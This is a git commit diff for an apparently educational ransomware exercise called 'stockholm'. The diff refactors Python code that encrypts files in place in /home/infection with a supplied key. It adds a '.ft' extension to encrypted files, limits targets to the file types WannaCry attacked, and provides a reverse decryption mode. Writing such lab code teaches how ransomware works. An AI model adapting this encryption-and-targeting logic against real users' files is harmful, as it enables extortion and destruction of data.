8e2f7dca301b8b3ba798039a8d323980a6bcd1d6
IcQuackson <pedrorenato1998@gmail.com>
2024-12-24 02:56:34 +0000

    refactor, rename files and restricted target extensions
    - Refactor processing the file for infecting or reversing
    - Program now adds .ft extension to infected files and removes it when reversing
    - Program now restricts target extensions to those affected by wannacry virus

--- src/script/stockholm.py
+++ src/script/stockholm.py
@@ -1,4 +1,4 @@
-from utils import log
+from utils import log, rename_file, load_extensions
 import os
 from os.path import isfile, join
 from encryption import ft_encrypt, ft_decrypt
@@ -6,39 +6,46 @@ from encryption import ft_encrypt, ft_decrypt
 SILENT_ENABLED = False
 INFECTION_DIR = "/home/infection"
 MINIMUM_KEY_LEN=16
+INFECTION_EXTENSION = ".ft"
+WANNACRY_EXTENSIONS = "./resources/wannacry_file_extensions.txt"
+
+def process_file(key, path, operation, new_name):
+    with open(path, 'rb') as file:
+        data = file.read()
+
+    processed_data = operation(key, data)
+    
+    with open(path, 'wb') as file:
+        file.write(processed_data)
+ 
+    rename_file(path, new_name)
 
 def infect_file(key, path):
 	log(f"Infecting {path}")
-	encrypted = ""
-	with open(path, 'rb') as file:
-		content = file.read()
-		encrypted = ft_encrypt(key, content)
-	
-	with open(path, 'wb') as file:
-		file.write(encrypted)
+	process_file(
+        key=key,
+        path=path,
+        operation=ft_encrypt,
+        new_name= path + INFECTION_EXTENSION
+    )
 
 def reverse_file(key, path):
 	log(f"Reversing {path}")
-	content = ""
-	with open(path, 'rb') as file:
-		encrypted = file.read()
-		content = ft_decrypt(key, encrypted)
+	process_file(
+        key=key,
+        path=path,
+        operation=ft_decrypt,
+        new_name= path[:-len(INFECTION_EXTENSION)]
+    )
 	
-	with open(path, 'wb') as file:
-		file.write(content)
-	
-def infect_directory(key, directory):
-	files = [join(directory, f) for f in os.listdir(directory) if isfile(join(directory, f))]
-
+def infect_directory(key, files):
 	for f in files:
 		try:
 			infect_file(key, f)
 		except Exception:
 			log("Error: Decryption failed")
 
-def reverse_directory(key, directory):
-	files = [join(directory, f) for f in os.listdir(directory) if isfile(join(directory, f))]
-
+def reverse_directory(key, files):
 	for f in files:
 		try:
 			reverse_file(key, f)
@@ -57,10 +64,19 @@ def stockholm(args):
 
 	if not os.path.exists(INFECTION_DIR):
 		raise ValueError("Target directory \'/home/infection\' does not exist.")
+	
+	wannacry_extensions = tuple(load_extensions(WANNACRY_EXTENSIONS))
+
+	files = [
+		join(INFECTION_DIR, f)
+		for f in os.listdir(INFECTION_DIR)
+		if isfile(join(INFECTION_DIR, f))
+			and (args.reverse or f.endswith(wannacry_extensions))
+	]
 
 	if args.reverse:
 		log("Reverse mode enabled")
-		reverse_directory(args.key, INFECTION_DIR)
+		reverse_directory(args.key, files)
 	else:
 		log("Infection mode enabled")
-		infect_directory(args.key, INFECTION_DIR)
+		infect_directory(args.key, files)
--- src/script/utils.py
+++ src/script/utils.py
@@ -1,5 +1,13 @@
+import os
 
 def log(str):
 	from stockholm import SILENT_ENABLED
 	if not SILENT_ENABLED:
 		print(str)
+
+def rename_file(filename, new_filename):
+	os.rename(filename, new_filename)
+
+def load_extensions(path):
+	with open(path, 'r') as file:
+		return [f.strip() for f in file.readlines()]
